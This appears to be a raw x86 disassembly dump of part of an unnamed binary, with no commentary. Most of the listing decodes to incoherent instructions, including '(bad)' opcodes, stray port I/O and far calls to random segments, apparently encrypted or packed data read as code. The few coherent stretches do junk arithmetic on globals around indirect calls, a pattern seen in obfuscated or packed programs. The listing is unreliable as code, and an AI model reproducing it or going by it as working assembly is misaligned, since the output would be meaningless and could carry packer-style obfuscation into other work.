  408d28:	jle    0x408cba
  408d2a:	fdiv   DWORD PTR [esi-0x79b076c5]
  408d30:	xlat   BYTE PTR ds:[ebx]
  408d31:	sbb    BYTE PTR [edi-0x6f],bl
  408d34:	int3   
  408d35:	pop    esp
  408d36:	add    eax,0x65d57d66
  408d3b:	ins    DWORD PTR es:[edi],dx
  408d3c:	loope  0x408ce8
  408d3e:	mov    ah,0xbc
  408d40:	mov    bh,0xae
  408d42:	mov    ah,0xc4
  408d44:	adc    eax,0x94b85616
  408d49:	fsub   DWORD PTR [ecx]
  408d4b:	fistp  QWORD PTR [ecx-0xcb030c6]
  408d51:	call   0x939c:0x1373b77c
  408d58:	pop    edi
  408d59:	lock aad 0xa3
  408d5c:	xor    DWORD PTR [ebp-0x2b],0xffffff95
  408d60:	mov    ds:0xeec8a8d1,al
  408d65:	pop    ebx
  408d66:	dec    esi
  408d67:	mov    ecx,0xaeb4e00f
  408d6c:	sub    DWORD PTR [esi-0x8],eax
  408d6f:	pop    ds
  408d70:	jbe    0x408d19
  408d72:	mov    bl,0xa2
  408d74:	pop    eax
  408d75:	shr    DWORD PTR [eax],0xb5
  408d78:	leave  
  408d79:	cmp    DWORD PTR [esp+edi*1+0x50],0x5c87691e
  408d81:	out    dx,al
  408d82:	rcl    dl,cl
  408d84:	sub    DWORD PTR [ebx],0x399f7407
  408d8a:	js     0x408d65
  408d8c:	or     al,0x1f
  408d8e:	xor    eax,0xb7ba0f70
  408d93:	dec    esi
  408d94:	repnz sbb eax,0x614c47b5
  408d9a:	pop    eax
  408d9b:	sbb    eax,0x45f5d3
  408da0:	jg     0x408d63
  408da2:	js     0x408d37
  408da4:	scas   al,BYTE PTR es:[edi]
  408da5:	imul   eax,eax,0xffffff84
  408da8:	and    al,0xa1
  408daa:	(bad)  
  408dab:	xor    BYTE PTR [edi-0x2d],dl
  408dae:	jmp    0xae3f:0x47f691e5
  408db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408db6:	inc    ecx
  408db7:	and    cl,al
  408db9:	and    ecx,esp
  408dbb:	jb     0x408d87
  408dbd:	jge    0x408dd8
  408dbf:	or     eax,0xe90df0e2
  408dc4:	push   ss
  408dc5:	sbb    edx,DWORD PTR [edi]
  408dc7:	sbb    edx,ebx
  408dc9:	pop    edx
  408dca:	mov    eax,ds:0xfd9bb714
  408dcf:	pop    es
  408dd0:	call   0x9905:0x67d0f469
  408dd7:	repz add al,0x5b
  408dda:	ins    BYTE PTR es:[edi],dx
  408ddb:	in     al,dx
  408ddc:	(bad)  
  408ddd:	xor    edx,esi
  408ddf:	fimul  DWORD PTR [eax+eiz*2-0x29]
  408de3:	jmp    0x849d:0x42bccdd0
  408dea:	inc    ebp
  408deb:	addr16 aaa 
  408ded:	mov    esp,?
  408def:	inc    edi
  408df0:	xor    al,0x1d
  408df2:	ins    BYTE PTR es:[edi],dx
  408df3:	test   DWORD PTR [eax+esi*8],ecx
  408df6:	sub    al,0xeb
  408df8:	pushf  
  408df9:	sub    al,0xd4
  408dfb:	add    al,0x65
  408dfd:	xor    al,0x3a
  408dff:	mov    eax,0xfeba685e
  408e04:	cmp    bh,BYTE PTR [ebx+0x6b]
  408e07:	xchg   bh,bh
  408e09:	jge    0x408e5c
  408e0b:	mov    dl,0xc6
  408e0d:	pop    esi
  408e0e:	add    DWORD PTR [edx-0xb],0x6f
  408e12:	sub    al,0xaa
  408e14:	fisttp DWORD PTR [edi+0x46]
  408e17:	sahf   
  408e18:	inc    ecx
  408e19:	cmp    al,0x86
  408e1b:	push   ss
  408e1c:	pushf  
  408e1d:	push   esi
  408e1e:	adc    bl,bl
  408e20:	and    dl,dh
  408e22:	adc    BYTE PTR [esi-0x45],dh
  408e25:	pop    ebx
  408e26:	adc    DWORD PTR [edx+eiz*4],ecx
  408e29:	sahf   
  408e2a:	jb     0x408e02
  408e2c:	popf   
  408e2d:	fnstenv [edx+0x67]
  408e30:	adc    cl,BYTE PTR [ebx]
  408e32:	pop    esp
  408e33:	fnstenv [edx+0x7f]
  408e36:	sub    BYTE PTR [ecx+0x18],bl
  408e39:	dec    edi
  408e3a:	pop    ebp
  408e3b:	je     0x408e18
  408e3d:	fiadd  DWORD PTR [edi]
  408e3f:	xor    BYTE PTR [esi+0x1a206de7],cl
  408e45:	mov    ebx,0x861ab27b
  408e4a:	xchg   ebp,eax
  408e4b:	popf   
  408e4c:	and    BYTE PTR [esi+0x7a],al
  408e4f:	xlat   BYTE PTR ds:[ebx]
  408e50:	aaa    
  408e51:	mov    ebx,0xcba7ca25
  408e56:	(bad)  
  408e57:	loopne 0x408e73
  408e59:	arpl   WORD PTR ds:0x83b095a2,ax
  408e5f:	iret   
  408e60:	clc    
  408e61:	div    BYTE PTR [eax-0x37709cb5]
  408e67:	inc    ebx
  408e68:	xchg   ebp,eax
  408e69:	iret   
  408e6a:	shr    BYTE PTR [edx],1
  408e6c:	push   edi
  408e6d:	lahf   
  408e6e:	lds    ecx,FWORD PTR [ecx-0x20bc293]
  408e74:	fild   WORD PTR [esi+0x188e5a3b]
  408e7a:	sub    edx,DWORD PTR [eax-0x7c00887d]
  408e80:	in     al,dx
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x428449,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	xlat   BYTE PTR ds:[ebx]
  408eaf:	lods   eax,DWORD PTR ds:[esi]
  408eb0:	or     bh,0x7a
  408eb3:	jge    0x408e73
  408eb5:	mov    esi,0xbebec279
  408eba:	out    dx,al
  408ebb:	mov    bh,0xdb
  408ebd:	sar    DWORD PTR [ebx],0x34
  408ec0:	lea    ecx,ds:0xca124964
  408ec6:	icebp  
  408ec7:	aas    
  408ec8:	outs   dx,BYTE PTR ds:[esi]
  408ec9:	mov    ch,0xee
  408ecb:	sbb    DWORD PTR [edx+0xc],ebx
  408ece:	std    
  408ecf:	sub    BYTE PTR [edi+0x62],dl
  408ed2:	repnz dec ebp
  408ed4:	adc    al,BYTE PTR [ebp-0x6b]
  408ed7:	xor    dh,BYTE PTR [ebx+0x7c]
  408eda:	jae    0x408f01
  408edc:	test   cl,bl
  408ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408edf:	and    al,0x3c
  408ee1:	mov    cl,0x94
  408ee3:	adc    al,0x48
  408ee5:	stos   BYTE PTR es:[edi],al
  408ee6:	es out 0x16,al
  408ee9:	imul   ebx,DWORD PTR [edx+ebx*1+0x1c],0xffffff85
  408eee:	sub    eax,0xe46e5236
  408ef3:	mov    ecx,0x984724f2
  408ef8:	call   0xd7b6cb1a
  408efd:	push   ebx
  408efe:	js     0x408ebf
  408f00:	in     al,0xac
  408f02:	popa   
  408f03:	mov    esi,0xe382a7c2
  408f08:	btc    DWORD PTR [ecx],ebp
  408f0b:	pop    esp
  408f0c:	inc    esi
  408f0d:	or     al,0x19
  408f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f10:	aam    0x53
  408f12:	and    esi,ecx
  408f14:	repz popf 
  408f16:	nop
  408f17:	push   esp
  408f18:	vminpd ymm7,ymm5,YMMWORD PTR [bx+si]
  408f1e:	xor    BYTE PTR [edx],bh
  408f20:	mov    ebx,0x20b3bf9
  408f25:	add    esi,esi
  408f27:	jb     0x408f35
  408f29:	jl     0x408f62
  408f2b:	jl     0x408f8c
  408f2d:	iret   
  408f2e:	pop    ebp
  408f2f:	(bad)  
  408f30:	pop    esi
  408f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f32:	test   al,0xa4
  408f34:	jnp    0x408f50
  408f36:	icebp  
  408f37:	jbe    0x408f08
  408f39:	int3   
  408f3a:	mov    al,ds:0x3ef9287d
  408f3f:	retf   0xdbe8
  408f42:	loope  0x408ef2
  408f44:	mov    al,0xc4
  408f46:	(bad)  
  408f47:	cmp    eax,0xe261797b
  408f4c:	ret    
  408f4d:	jmp    0x27d8:0x34d53df3
  408f54:	call   0x1201ec15
  408f59:	jne    0x408f5a
  408f5b:	jp     0x408fa3
  408f5d:	data16 rol BYTE PTR [ebx-0x21],cl
  408f61:	sub    esi,DWORD PTR [ebx]
  408f63:	or     ch,BYTE PTR [ebp+0x5f282044]
  408f69:	sbb    al,0xeb
  408f6b:	push   eax
  408f6c:	nop
  408f6d:	cmp    al,0xd7
  408f6f:	mov    ebp,0xc7481b4f
  408f74:	fimul  WORD PTR [eax]
  408f76:	adc    eax,0x73895180
  408f7b:	dec    BYTE PTR [eax+0x59]
  408f7e:	cmp    DWORD PTR es:[edi+esi*2+0x7e776b7],ecx
  408f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f87:	jmp    0x408f10
  408f89:	or     eax,0x44e77209
  408f8e:	mov    ds:0x23e19af4,al
  408f93:	pop    edi
  408f94:	les    edx,FWORD PTR [esi+0x27a9f7f2]
  408f9a:	repz fmul DWORD PTR ds:0xa5fdc31f
  408fa1:	push   es
  408fa2:	push   0xf0cb0e90
  408fa7:	inc    esi
  408fa8:	inc    ebx
  408fa9:	(bad)  
  408faa:	je     0x409004
  408fac:	push   ebp
  408fad:	jno    0x408f97
  408faf:	xchg   ebx,eax
  408fb0:	inc    esp
  408fb1:	(bad)  
  408fb2:	ins    BYTE PTR es:[edi],dx
  408fb3:	mov    DWORD PTR [ebp-0x66],esp
  408fb6:	xor    BYTE PTR [edx+0x17c50345],dh
  408fbc:	push   ebp
  408fbd:	out    0xaa,eax
  408fbf:	ins    DWORD PTR es:[edi],dx
  408fc0:	xor    al,0x71
  408fc2:	imul   ebx,DWORD PTR [edi],0xffffffcf
  408fc5:	inc    ecx
  408fc6:	cmc    
  408fc7:	mov    bl,0x34
  408fc9:	imul   ecx,DWORD PTR [ebx-0x1c926f67],0xab49aac9
  408fd3:	loopne 0x40902d
  408fd5:	fcomp  QWORD PTR [esi-0x50ffe99b]
  408fdb:	or     al,BYTE PTR [edx]
  408fdd:	pop    esp
  408fde:	lods   al,BYTE PTR ds:[esi]
  408fdf:	push   esi
  408fe0:	mov    ebx,0x29d85d2e
  408fe5:	loopne 0x40904e
  408fe7:	or     ebp,ebx
  408fe9:	rcr    BYTE PTR [ecx+0x7addeff7],0xbf
  408ff0:	dec    ecx
  408ff1:	jno    0x408fc3
  408ff3:	dec    esp
  408ff4:	rcr    bl,0x1a
  408ff7:	and    ah,BYTE PTR [eax-0x80]
  408ffa:	sar    DWORD PTR [edx-0x68785399],0xc3
  409001:	push   esp
  409002:	mov    eax,0xabde5e82
  409007:	xor    bh,BYTE PTR [esi+0xc8780df]
  40900d:	mov    ebx,0x69b075fe
  409012:	dec    eax
  409013:	and    al,0x58
  409015:	dec    ebp
  409016:	pop    DWORD PTR [ebx]
  409018:	push   eax
  409019:	lds    eax,FWORD PTR ds:0x751c4b8f
  40901f:	shl    DWORD PTR [ecx-0x7204dddc],0x6b
  409026:	pop    esi
  409027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409028:	adc    eax,0x977646f9
  40902d:	mov    esp,0x4fad3f1a
  409032:	jp     0x4090a1
  409034:	into   
  409035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409036:	cmp    BYTE PTR [ecx],0x5a
  409039:	(bad)  
  40903a:	ins    BYTE PTR es:[edi],dx
  40903b:	inc    edi
  40903c:	mov    DWORD PTR [edx],ebx
  40903e:	ror    dh,0xab
  409041:	or     DWORD PTR [eax+0x1bea31ad],edx
  409047:	in     al,0xfc
  409049:	ss jle 0x408fe2
  40904c:	ror    DWORD PTR [edx+ebx*8],1
  40904f:	mov    ah,0xe7
  409051:	mov    WORD PTR [ebx-0x58],?
  409054:	pushf  
  409055:	jns    0x409099
  409057:	xchg   ebp,eax
  409058:	repnz rcl DWORD PTR [esi-0x6c],0xf0
  40905d:	and    eax,0xde48357a
  409062:	jbe    0x4090d1
  409064:	pop    ds
  409065:	(bad)  
  409066:	xor    ebx,edx
  409068:	fstp   DWORD PTR [ebx-0x69]
  40906b:	mov    ?,esp
  40906d:	(bad)  
  40906e:	xor    ebp,DWORD PTR [ecx+0x53925664]
  409074:	inc    ebp
  409075:	add    DWORD PTR [edx-0x78c4faf6],0x4b
  40907c:	adc    ebp,eax
  40907e:	pop    ecx
  40907f:	mov    ch,0xbf
  409081:	mov    eax,0xca053633
  409086:	xchg   ecx,eax
  409087:	sub    DWORD PTR [esi+eax*8],esp
  40908a:	arpl   bx,si
  40908c:	pop    edx
  40908d:	les    ebp,FWORD PTR [ebx+0x6]
  409090:	push   ebp
  409091:	adc    BYTE PTR [edi],cl
  409093:	or     dh,cl
  409095:	sub    bh,BYTE PTR [eax]
  409097:	inc    esi
  409098:	test   eax,0x2657a32c
  40909d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40909e:	rcr    BYTE PTR [esi-0x73],1
  4090a1:	int    0xd2
  4090a3:	popa   
  4090a4:	xchg   edi,eax
  4090a5:	lock jl 0x409115
  4090a8:	mov    bl,0xcd
  4090aa:	add    BYTE PTR [esi],dh
  4090ac:	and    eax,0x35bbcd26
  4090b1:	ins    BYTE PTR es:[edi],dx
  4090b2:	call   0x6d7a:0xb6b42452
  4090b9:	xor    al,0x50
  4090bb:	or     ah,BYTE PTR [edx+0xf]
  4090be:	ins    BYTE PTR es:[edi],dx
  4090bf:	dec    esi
  4090c0:	push   edx
  4090c1:	mov    cl,0x76
  4090c3:	inc    eax
  4090c4:	hlt    
  4090c5:	jle    0x409048
  4090c7:	outs   dx,DWORD PTR ds:[esi]
  4090c8:	adc    edx,ebp
  4090ca:	sti    
  4090cb:	enter  0x592b,0x99
  4090cf:	cmp    cl,dh
  4090d1:	sub    al,0x50
  4090d3:	popf   
  4090d4:	push   ss
  4090d5:	jb     0x40906c
  4090d7:	dec    esi
  4090d8:	and    esp,DWORD PTR [edi+0x3a]
  4090db:	sub    eax,0x1916d9a0
  4090e0:	out    0x21,eax
  4090e2:	jo     0x40914e
  4090e4:	arpl   WORD PTR [esi],si
  4090e6:	cli    
  4090e7:	jae    0x40913b
  4090e9:	xor    cl,BYTE PTR [ecx-0x24abafed]
  4090ef:	mov    al,ds:0x5f801e32
  4090f4:	cdq    
  4090f5:	add    DWORD PTR [esi],ecx
  4090f7:	mov    WORD PTR [edi-0x77],cs
  4090fa:	in     eax,dx
  4090fb:	outs   dx,DWORD PTR ds:[esi]
  4090fc:	das    
  4090fd:	cmp    al,0x59
  4090ff:	dec    edx
  409100:	fcomip st,st(2)
  409102:	mov    edx,DWORD PTR [ebp-0xae0db3d]
  409108:	push   edx
  409109:	xor    DWORD PTR [edi+0xb867d24],eax
  40910f:	mov    ch,0x75
  409111:	xor    al,cl
  409113:	fisubr DWORD PTR [ecx-0x6b]
  409116:	add    eax,0xe7dff356
  40911b:	sub    eax,0x72d045c7
  409120:	mov    ch,0x79
  409122:	retf   
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428571,0x0
  40912d:	mov    DWORD PTR ds:0x42856d,0x24a6
  409137:	mov    DWORD PTR ds:0x428421,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x4284c5,0x7db9
  409152:	cmp    DWORD PTR ds:0x428571,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x428147
  409169:	push   0x4282f3
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428369
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x428409,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428471
  409188:	add    DWORD PTR ds:0x428341,ecx
  40918e:	neg    DWORD PTR ds:0x428335
  409194:	xor    DWORD PTR ds:0x4284f5,ebx
  40919a:	or     DWORD PTR ds:0x428429,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x4283b9
  4091cb:	mov    eax,ds:0x42852d
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x428341,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x4284f1
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x4284f1,0x428579
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x4284fd,0x428419
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x4284ed,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x4284ed,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x4284f9,0x428411
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x428441,0x42855d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x428425,0x4284c9
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428369,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x42842d
  409280:	xor    esi,DWORD PTR ds:0x428465
  409286:	mov    DWORD PTR ds:0x42842d,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428569
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	frstor [ecx]
  4092a8:	add    al,0xdd
  4092aa:	xor    eax,0x79bebe83
  4092af:	ret    0xbebe
  4092b2:	xchg   esi,eax
  4092b3:	ror    DWORD PTR [si-0x7ce0],1
  4092b8:	push   cs
  4092b9:	pop    edx
  4092ba:	mov    esp,0xd154be29
  4092bf:	sbb    edx,DWORD PTR [ebx]
  4092c1:	sahf   
  4092c2:	lea    eax,[ebp+0x20a5a724]
  4092c8:	loope  0x409272
  4092ca:	or     dh,cl
  4092cc:	dec    esp
  4092cd:	pop    ebp
  4092ce:	mov    dl,0x5b
  4092d0:	add    al,0x3
  4092d2:	call   0xfcb428a2
  4092d7:	dec    edi
  4092d8:	mov    ch,0x57
  4092da:	sub    al,0xa3
  4092dc:	dec    eax
  4092dd:	test   eax,0x2734dc47
  4092e2:	sti    
  4092e3:	jnp    0x409347
  4092e5:	nop
  4092e6:	scas   eax,DWORD PTR es:[edi]
  4092e7:	fwait
  4092e8:	data16 loop 0x409320
  4092eb:	push   es
  4092ec:	call   0xb409:0xd0e52c73
  4092f3:	adc    BYTE PTR [edi-0x60],dh
  4092f6:	loop   0x40933e
  4092f8:	lahf   
  4092f9:	ins    DWORD PTR es:[edi],dx
  4092fa:	invd   
  4092fc:	mov    esp,DWORD PTR [edi]
  4092fe:	enter  0x2754,0xa3
  409302:	fmul   QWORD PTR [esi-0x7a]
  409305:	mov    ebx,0xfa82060b
  40930a:	adc    DWORD PTR [eax-0x58],edi
  40930d:	ss nop
  40930f:	adc    DWORD PTR [edi+0x4cb0a7ec],ecx
  409315:	stos   DWORD PTR es:[edi],eax
  409316:	mov    dl,BYTE PTR [esi+0x70dc3eb9]
  40931c:	fld    TBYTE PTR [ebp-0x38]
  40931f:	cwde   
  409320:	pop    ebx
  409321:	mov    bl,0xca
  409323:	int    0xec
  409325:	jp     0x4092fd
  409327:	mov    esi,0x92835b00
  40932c:	pushf  
  40932d:	nop
  40932e:	mov    bl,0x12
  409330:	sbb    esp,DWORD PTR ss:[edi+0x2d]
  409334:	retf   
  409335:	or     ch,bl
  409337:	push   ss
  409338:	adc    DWORD PTR [ecx+ebp*8-0x6464f027],ebx
  40933f:	shl    BYTE PTR [ebp-0x66],cl
  409342:	loop   0x40939d
  409344:	push   0x7585cfe9
  409349:	fdiv   DWORD PTR [ebp+0xbb0ac66]
  40934f:	mov    bh,0xd3
  409351:	and    DWORD PTR [edx+ebx*4+0x7f33b8a3],ecx
  409358:	or     edi,DWORD PTR [ecx+0x2]
  40935b:	xchg   edi,eax
  40935c:	mov    edi,0x246d33d2
  409361:	or     ebp,DWORD PTR [edx+0x76b71b68]
  409367:	loope  0x409319
  409369:	std    
  40936a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40936b:	inc    esi
  40936c:	outs   dx,DWORD PTR ds:[esi]
  40936d:	je     0x409373
  40936f:	pop    esi
  409370:	icebp  
  409371:	iret   
  409372:	cmp    eax,0x1cf9e73
  409377:	xchg   esi,eax
  409378:	(bad)  
  409379:	xchg   ebx,eax
  40937a:	mov    dl,0xb0
  40937c:	in     eax,dx
  40937d:	les    eax,FWORD PTR [esi-0x524b0646]
  409383:	mov    dl,cl
  409385:	jae    0x409344
  409387:	enter  0x5120,0xff
  40938b:	cmc    
  40938c:	mov    ch,0xb3
  40938e:	(bad)  
  40938f:	jl     0x4093ab
  409391:	mov    ah,0x6f
  409393:	jecxz  0x409385
  409395:	or     ah,BYTE PTR [esi+0x1d]
  409398:	sub    esi,ecx
  40939a:	loop   0x40933a
  40939c:	or     al,0x59
  40939e:	lods   al,BYTE PTR ds:[esi]
  40939f:	test   BYTE PTR [edi-0x2cac6f1b],cl
  4093a5:	xchg   esi,eax
  4093a6:	pop    ebp
  4093a7:	xchg   esp,eax
  4093a8:	mov    ss:0x6a3e16fe,eax
  4093ae:	test   BYTE PTR [edi-0x300368ec],dh
  4093b4:	push   edx
  4093b5:	popa   
  4093b6:	xchg   BYTE PTR [eax-0x1d],ch
  4093b9:	hlt    
  4093ba:	dec    ecx
  4093bb:	repz mov gs,WORD PTR [esp+esi*2]
  4093bf:	mov    BYTE PTR [ebx-0x7457d705],ch
  4093c5:	(bad)  
  4093c6:	fsubrp st(3),st
  4093c8:	pop    ecx
  4093c9:	popa   
  4093ca:	mov    cs,WORD PTR [ecx-0x3fe4af49]
  4093d0:	sub    bh,BYTE PTR [eax+0xad239e4]
  4093d6:	and    DWORD PTR [esi+0x3761843d],ebx
  4093dc:	xchg   ebx,eax
  4093dd:	cdq    
  4093de:	sbb    BYTE PTR [eax],ah
  4093e0:	aas    
  4093e1:	int3   
  4093e2:	in     eax,0xad
  4093e4:	pop    esi
  4093e5:	cdq    
  4093e6:	cwde   
  4093e7:	xchg   esi,eax
  4093e8:	cmp    eax,0xcd83236f
  4093ed:	push   0x5577b109
  4093f2:	pop    esi
  4093f3:	dec    esi
  4093f4:	pop    es
  4093f5:	cdq    
  4093f6:	mov    BYTE PTR [eax-0x5d],0xc5
  4093fa:	mov    ds:0x7ef27c0b,eax
  4093ff:	loopne 0x4093b1
  409401:	push   eax
  409402:	bound  ecx,QWORD PTR [ecx]
  409404:	xchg   esi,eax
  409405:	sub    BYTE PTR [edi+0x91a5b28],bl
  40940b:	ja     0x40945a
  40940d:	repnz dec edi
  40940f:	pop    edi
  409410:	jecxz  0x40948c
  409412:	and    DWORD PTR [edi-0x38],0xffffffb3
  409416:	pop    edx
  409417:	pop    es
  409418:	popf   
  409419:	iret   
  40941a:	lea    edx,[edi-0x758abb8f]
  409420:	pop    edi
  409421:	dec    ebx
  409422:	and    cl,0x15
  409425:	sub    BYTE PTR [eax],0x1
  409428:	xchg   esp,eax
  409429:	dec    eax
  40942a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40942b:	stos   BYTE PTR es:[edi],al
  40942c:	cmp    dl,BYTE PTR [ecx-0x1b38638a]
  409432:	pop    ebp
  409433:	das    
  409434:	clc    
  409435:	sbb    cl,BYTE PTR [ebx+0x3f1eed7a]
  40943b:	ror    BYTE PTR [esi],0x61
  40943e:	sub    eax,0xe19baf48
  409443:	sbb    ecx,DWORD PTR [ecx]
  409445:	in     eax,0x7c
  409447:	icebp  
  409448:	data16 xchg bx,ax
  40944b:	jle    0x409443
  40944d:	mov    eax,0xf693d6c8
  409452:	mov    edx,0xa2b8fbdd
  409457:	test   DWORD PTR [ebx],ecx
  409459:	in     eax,0x31
  40945b:	shl    DWORD PTR [edx+0x7b9be1bc],1
  409461:	xor    edi,DWORD PTR [ebx-0x410c0a5f]
  409467:	mul    BYTE PTR [edx+0x1c]
  40946a:	test   DWORD PTR [eax+0x28],eax
  40946d:	cld    
  40946e:	sbb    bh,al
  409470:	mov    ah,0xc3
  409472:	in     al,0x62
  409474:	cli    
  409475:	cli    
  409476:	pop    edx
  409477:	fwait
  409478:	fs pushf 
  40947a:	imul   ecx,esp,0x5a
  40947d:	das    
  40947e:	es jge 0x4094c1
  409481:	shl    BYTE PTR [edx-0x53b683d3],0xea
  409488:	(bad)  
  409489:	sbb    ch,al
  40948b:	mov    cs,WORD PTR [ecx+0x498ef089]
  409491:	xor    BYTE PTR [edx-0x62],0x20
  409495:	mov    ds:0xbcb104c8,al
  40949a:	lock aam 0x33
  40949d:	loop   0x4094d8
  40949f:	mov    edx,0x97eccfc9
  4094a4:	add    DWORD PTR [edx+0x11244914],0xffffffec
  4094ab:	dec    BYTE PTR [edx-0x3b6e0006]
  4094b1:	xchg   ecx,eax
  4094b2:	imul   esp,ecx,0x8306904f
  4094b8:	jns    0x409539
  4094ba:	jno    0x409505
  4094bc:	or     eax,0x556aebb1
  4094c1:	jns    0x409499
  4094c3:	push   esp
  4094c4:	xor    edx,ebx
  4094c6:	test   eax,0xaa4fae21
  4094cb:	in     al,dx
  4094cc:	mov    ds:0x20eff531,al
  4094d1:	dec    ebx
  4094d2:	sub    BYTE PTR [ebx*1+0x30dacee],ah
  4094d9:	xchg   ebp,eax
  4094da:	jo     0x409518
  4094dc:	lock sbb al,0xd8
  4094df:	shl    DWORD PTR [eax-0x14],0xac
  4094e3:	je     0x4094e2
  4094e5:	mov    esp,0xcba586ea
  4094ea:	pop    ebp
  4094eb:	sti    
  4094ec:	in     eax,dx
  4094ed:	bswap  ecx
  4094ef:	enter  0xd2cd,0xbb
  4094f3:	lods   al,BYTE PTR ds:[esi]
  4094f4:	push   cs
  4094f5:	aas    
  4094f6:	scas   al,BYTE PTR es:[edi]
  4094f7:	and    edx,edi
  4094f9:	xor    bl,BYTE PTR [ecx-0x4b]
  4094fc:	outs   dx,BYTE PTR ds:[esi]
  4094fd:	loop   0x409513
  4094ff:	lods   al,BYTE PTR ds:[esi]
  409500:	shl    DWORD PTR [edi-0x73],0x44
  409504:	in     al,dx
  409505:	or     cl,bl
  409507:	mov    eax,ds:0xfa43cdbe
  40950c:	dec    eax
  40950d:	cwde   
  40950e:	loopne 0x409507
  409510:	lods   al,BYTE PTR ds:[esi]
  409511:	xchg   ecx,eax
  409512:	push   ds
  409513:	add    al,0x8b
  409515:	jne    0x4094f3
  409517:	adc    DWORD PTR ds:0x42834d,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x428341
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428551
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428451,0x42846d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x428345,0x42834d
  409545:	call   0x422281
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x428439,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x428549,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x428435
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x428439,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428451
  40958b:	push   0x4282f3
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42855d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x42844d
  4095a6:	or     ecx,DWORD PTR ds:0x428465
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x4284ed,edx
  4095b4:	sbb    DWORD PTR ds:0x428441,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428465,0x428581
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x428415,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x4283e9
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42835d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x42842d,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
